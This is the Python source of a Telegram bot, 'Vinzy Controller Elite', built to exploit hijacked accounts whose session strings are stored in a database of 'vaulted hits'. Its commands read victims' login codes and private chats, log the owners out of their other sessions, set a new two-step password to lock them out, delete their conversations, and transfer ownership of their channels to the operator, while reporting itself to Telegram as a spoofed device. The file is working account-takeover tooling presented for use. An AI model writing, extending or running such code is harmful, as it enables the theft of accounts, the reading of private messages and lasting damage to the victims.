# =========================================================================
# PROJECT: VINZY CONTROLLER ELITE (V4.6 - THE MERCHANT EDITION)
# AUTHOR: VINZY DIGITAL SERVICES
# DESCRIPTION: ENTERPRISE-GRADE TELEGRAM SESSION MANAGEMENT & CONTROL
# PLATFORM: PYTHON 3.10+ | TELETHON | PYTELEGRAMBOTAPI | NEON POSTGRES
# =========================================================================

import os
import time
import asyncio
import logging
import psycopg2
import sys
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from datetime import datetime

# --- 1. ADVANCED LOGGING INFRASTRUCTURE ---
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyElite")

# --- 2. GLOBAL CONFIGURATION & CREDENTIALS ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except (ValueError, TypeError):
    logger.error("GROUP_ID is missing. The bot will not respond to commands.")
    GROUP_ID = 0

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("FATAL: Environment variables BOT_TOKEN or DATABASE_URL are missing.")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---

class VaultManager:
    """Handles high-performance database operations for session storage."""
    
    @staticmethod
    def get_connection():
        try:
            return psycopg2.connect(DATABASE_URL, sslmode='require')
        except Exception as e:
            logger.error(f"Database Connection Failed: {e}")
            return None

    @classmethod
    def initialize_db(cls):
        conn = cls.get_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                        phone TEXT PRIMARY KEY,
                        session_string TEXT NOT NULL,
                        ip_address TEXT,
                        device_info TEXT DEFAULT 'iPhone 15 Pro Max',
                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
                    );
                ''')
                conn.commit()
                cur.close()
                logger.info("Database initialized successfully.")
            except Exception as e:
                logger.error(f"Database Init Error: {e}")
            finally:
                conn.close()

    @classmethod
    def upsert_session(cls, phone, session_str):
        conn = cls.get_connection()
        if not conn: return False
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string)
                VALUES (%s, %s)
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
            """, (phone, session_str))
            conn.commit()
            cur.close()
            return True
        except Exception as e:
            logger.error(f"Upsert Error: {e}")
            return False
        finally:
            conn.close()

    @classmethod
    def get_session(cls, phone):
        conn = cls.get_connection()
        if not conn: return None
        try:
            cur = conn.cursor()
            cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
            res = cur.fetchone()
            cur.close()
            return res[0] if res else None
        finally:
            conn.close()

    @classmethod
    def list_all(cls):
        conn = cls.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
            data = cur.fetchall()
            cur.close()
            return data
        finally:
            conn.close()

# --- 4. ASYNC TASK ENGINE (TELETHON WRAPPER) ---

async def run_logic(phone, callback, *args):
    """Execution wrapper for all commands with spoofed iPhone 15 Pro Max data."""
    session_str = VaultManager.get_session(phone)
    if not session_str:
        return f"❌ <b>Error:</b> Account <code>{phone}</code> is not in the vault."

    client = TelegramClient(
        StringSession(session_str),
        API_ID, API_HASH,
        device_model="iPhone 15 Pro Max",
        system_version="17.4.1",
        app_version="10.10.1"
    )

    try:
        logger.info(f"Targeting Account: {phone}")
        await asyncio.wait_for(client.connect(), timeout=25)

        if not await client.is_user_authorized():
            return f"❌ <b>Failed:</b> Session for <code>{phone}</code> is dead/revoked."

        return await callback(client, *args)

    except asyncio.TimeoutError:
        return "⚠️ <b>Timeout:</b> Telegram server failed to respond in time."
    except errors.FloodWaitError as e:
        return f"⏳ <b>Flood:</b> Please wait {e.seconds} seconds."
    except Exception as e:
        logger.error(f"Task Failure: {e}")
        return f"⚠️ <b>System Error:</b> {str(e)}"
    finally:
        await client.disconnect()

# --- 5. FUNCTIONAL LOGIC MODULES ---

async def logic_auth_manual(session_str):
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ <b>Rejected:</b> The provided session string is invalid."
        
        me = await client.get_me()
        if not me.phone:
            return "❌ <b>Incomplete:</b> Session valid, but phone number is hidden."
        
        if VaultManager.upsert_session(me.phone, session_str):
            return (
                f"✅ <b>Manual Auth Success!</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📱 <b>Phone:</b> <code>{me.phone}</code>\n"
                f"👤 <b>Name:</b> {me.first_name}\n"
                f"🆔 <b>UID:</b> <code>{me.id}</code>\n"
                f"━━━━━━━━━━━━━━━"
            )
        return "❌ <b>DB Error:</b> Could not save session."
    finally:
        await client.disconnect()

async def logic_get_info(client):
    me = await client.get_me()
    return (
        f"📊 <b>Full Account Intel</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b> {me.first_name} {me.last_name or ''}\n"
        f"📱 <b>Phone:</b> +{me.phone}\n"
        f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
        f"💎 <b>Premium:</b> {'Yes' if me.premium else 'No'}\n"
        f"🛡️ <b>Scam/Fake:</b> {'Yes' if me.scam or me.fake else 'No'}\n"
        f"━━━━━━━━━━━━━━━"
    )

async def logic_check_2fa(client):
    try:
        res = await client(functions.account.GetPasswordRequest())
        if res.has_password:
            return f"🔐 <b>2FA ENABLED:</b> Hint: <code>{res.hint or 'None'}</code>"
        return "🔓 <b>2FA DISABLED:</b> Account is vulnerable."
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

async def logic_kick_all(client):
    try:
        await client(functions.auth.ResetAuthorizationsRequest())
        return "⚡ <b>Success:</b> All other active sessions have been wiped."
    except errors.FreshResetAuthorisationForbiddenError:
        return "❌ <b>Forbidden:</b> Session is too new (needs 24h-72h age)."

async def logic_get_code(client):
    async for msg in client.iter_messages(777000, limit=1):
        if msg.text:
            return f"📟 <b>Latest System Message:</b>\n\n<code>{msg.text}</code>"
    return "📭 <b>Inbox Empty:</b> No codes found."

async def logic_list_chats(client, limit):
    output = f"💬 <b>Recent {limit} Chats:</b>\n\n"
    async for d in client.iter_dialogs(limit=limit):
        icon = "👤" if d.is_user else "👥"
        output += f"{icon} <code>{d.id}</code> | <b>{d.name}</b>\n"
    return output

async def logic_read_msgs(client, cid, limit):
    try:
        output = f"📩 <b>Chat Logs for {cid}:</b>\n\n"
        async for m in client.iter_messages(cid, limit=limit):
            who = "Victim" if m.out else "Partner"
            text = m.text[:50] + "..." if m.text and len(m.text) > 50 else (m.text or "[Media]")
            output += f"<b>{who}:</b> {text}\n"
        return output
    except Exception as e:
        return f"⚠️ Failed to read {cid}: {str(e)}"

async def logic_clean_account(client):
    """Purges DMs, Groups, and Non-Owned Channels."""
    count = 0
    protected = 0
    async for dialog in client.iter_dialogs():
        try:
            if dialog.is_user:
                await client(functions.messages.DeleteHistoryRequest(peer=dialog.input_entity, max_id=0, just_clear=False, revoke=True))
                count += 1
            elif dialog.is_group:
                await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
                count += 1
            elif dialog.is_channel:
                try:
                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
                    if isinstance(p.participant, (tl_types.ChannelParticipantAdmin, tl_types.ChannelParticipantCreator)):
                        protected += 1
                        continue
                    else:
                        await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
                        count += 1
                except:
                    await client(functions.channels.LeaveChannelRequest(channel=dialog.input_entity))
                    count += 1
        except: continue
    return f"🧹 <b>Atomic Wipe Complete:</b> Purged <code>{count}</code> items. Protected <code>{protected}</code> Admin channels."

async def logic_transfer_channels(client, target_username):
    """Transfers ownership of all owned channels to target."""
    try:
        target_entity = await client.get_input_entity(target_username)
        count = 0
        async for dialog in client.iter_dialogs():
            if dialog.is_channel:
                try:
                    p = await client(functions.channels.GetParticipantRequest(channel=dialog.input_entity, participant='me'))
                    if isinstance(p.participant, tl_types.ChannelParticipantCreator):
                        await client(functions.channels.EditCreatorRequest(channel=dialog.input_entity, user_id=target_entity, password=''))
                        count += 1
                except: continue
        return f"✅ <b>Success:</b> Transferred <code>{count}</code> channels to @{target_username}."
    except Exception as e: return f"❌ <b>Transfer Error:</b> {str(e)}"

# --- 6. TELEGRAM BOT HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def handle_help(m):
    if m.chat.id != GROUP_ID: return
    text = (
        "👑 <b>VINZY CONTROLLER ELITE V4.6</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔌 <b>ACCESS</b>\n"
        "• <code>.auth [session]</code> - Inject session\n"
        "• <code>.list</code> - List vault\n\n"
        "🛡️ <b>CONTROL</b>\n"
        "• <code>.info [phone]</code> - Stats\n"
        "• <code>.lock [phone]</code> - 2FA status\n"
        "• <code>.wipe [phone]</code> - Logout others\n"
        "• <code>.secure [phone] [pw]</code> - Set 2FA\n\n"
        "☢️ <b>PURGE & TRADE</b>\n"
        "• <code>.clean [phone]</code> - Atomic Wipe\n"
        "• <code>.transfer [phone] [user]</code> - Give ownership\n\n"
        "🕵️ <b>DISCOVERY</b>\n"
        "• <code>.code [phone]</code> - Get code\n"
        "• <code>.chats [phone] [limit]</code> - List dialogs\n"
        "• <code>.dump [phone] [id] [limit]</code> - Read chat\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ", 1)
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
    res = asyncio.run(logic_auth_manual(args[1].strip()))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    hits = VaultManager.list_all()
    if not hits: return bot.send_message(m.chat.id, "📭 Vault is empty.")
    msg = "📋 <b>Vaulted Hits:</b>\n\n"
    for p, d in hits:
        msg += f"📱 <code>{p}</code> | {d.strftime('%m/%d %H:%M')}\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.info'))
def cmd_info(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return
    res = asyncio.run(run_logic(args[1], logic_get_info))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
def cmd_wipe(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return
    res = asyncio.run(run_logic(args[1], logic_kick_all))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.clean'))
def cmd_clean(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return
    bot.send_message(m.chat.id, f"☢️ <b>Atomic Wipe Initiated for +{args[1]}...</b>")
    res = asyncio.run(run_logic(args[1], logic_clean_account))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.transfer'))
def cmd_transfer(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.transfer [phone] [target_user]</code>")
    bot.send_message(m.chat.id, f"🚀 <b>Transferring Owned Channels to @{parts[2]}...</b>")
    res = asyncio.run(run_logic(parts[1], logic_transfer_channels, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.code'))
def cmd_code(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return
    res = asyncio.run(run_logic(args[1], logic_get_code))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def cmd_chats(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return
    limit = int(args[2]) if len(args) > 2 else 15
    res = asyncio.run(run_logic(args[1], logic_list_chats, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.dump'))
def cmd_dump(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split()
    if len(parts) < 3: return
    res = asyncio.run(run_logic(parts[1], logic_read_msgs, parts[2], int(parts[3]) if len(parts) > 3 else 10))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.secure'))
def cmd_secure(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3: return
    async def s_fn(c, p):
        await c.edit_2fa(new_password=p)
        return f"✅ 2FA set: <code>{p}</code>"
    res = asyncio.run(run_logic(parts[1], s_fn, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- 7. MAIN STARTUP SEQUENCE ---

def main():
    print("""
 __      ___                 _____ _                  
 \ \    / (_)               / ____| |                 
  \ \  / / _ _ __  _____   | (___ | |_ ___  _ __ ___  
   \ \/ / | | '_ \|_  / | | \___ \| __/ _ \| '__/ _ \ 
    \  /  | | | | |/ /| |_| |___) | || (_) | | |  __/ 
     \/   |_|_| |_/___|\__, |_____/ \__\___/|_|  \___| 
                        __/ |                         
                       |___/                          
    """)
    VaultManager.initialize_db()
    logger.info("Vinzy Controller Elite v4.6 Online.")
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            logger.error(f"Polling error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
